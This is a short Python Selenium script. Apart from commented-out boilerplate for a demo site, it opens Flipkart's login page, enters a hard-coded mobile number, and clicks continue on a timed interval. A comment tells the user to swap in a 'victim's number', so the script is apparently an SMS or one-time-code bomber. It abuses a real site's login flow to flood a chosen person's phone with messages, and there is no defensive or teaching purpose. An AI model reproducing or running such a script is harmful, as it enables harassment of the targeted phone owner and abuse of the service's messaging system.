# import utilities
# from selenium import webdriver
#
# driver = webdriver.Chrome()
# driver.get("https://demo.guru99.com/test/newtours/")
# driver.maximize_window()
# driver.implicitly_wait(30)
# print("working")
# path = ""
# driver.close()

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time
for i in range(1):
    # create instance of Chrome webdriver
    driver=webdriver.Chrome()
    driver.get("https://www.flipkart.com/account/login?ret=/")
    # find the element where we have to
    # enter the xpath
    # target mobile number, change it to victim's number and
    # also ensure that it's registered on flipkart
    driver.find_element(By.XPATH,'//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input').send_keys('7659863220')
    # find the element continue
    # request using xpath
    # clicking on that element
    driver.find_element(By.XPATH,'//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[3]/button').click()
    # find the element to send a forgot password
    # request using xpath

    # set the interval to send each sms
    time.sleep(20)

    # Close the browser
    driver.close()
